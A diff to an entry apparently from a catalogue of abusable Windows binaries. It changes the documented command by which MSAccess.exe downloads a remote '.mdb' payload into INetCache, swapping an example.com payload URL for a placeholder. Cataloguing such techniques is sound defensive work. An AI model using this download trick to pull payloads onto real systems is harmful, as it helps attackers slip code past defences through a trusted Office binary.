@@ -4,7 +4,7 @@ Description: Microsoft Office component
 Author: Nir Chako
 Created: 2023-04-30
 Commands:
-  - Command: MSAccess.exe https://example.com/payload.exe.mdb
+  - Command: MSAccess.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.
     Category: Download
